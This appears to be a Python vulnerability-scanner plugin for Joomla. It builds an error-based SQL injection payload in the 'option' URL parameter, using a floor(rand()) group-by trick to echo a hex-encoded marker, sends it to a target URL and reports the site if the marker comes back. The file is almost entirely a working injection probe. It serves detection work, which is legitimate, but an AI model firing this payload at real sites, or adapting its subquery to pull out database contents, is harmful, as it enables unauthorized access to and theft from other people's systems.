#!/usr/bin/env python
# -*- coding: utf-8 -*-
def assign(service, arg):
    if service == 'joomla':
        return True, arg
def audit(arg):
    payload = 'index.php?option=(select+1+from+(select+count(*)%2cconcat((select+0x7465737476756c776b)%2cfloor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)'
    target = arg + payload
    
    code, head, res, errcode, _ = curl.curl2(target);
    if 'testvulwk' in res:
        security_note(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla', 'http://www.testvul.net/')[1])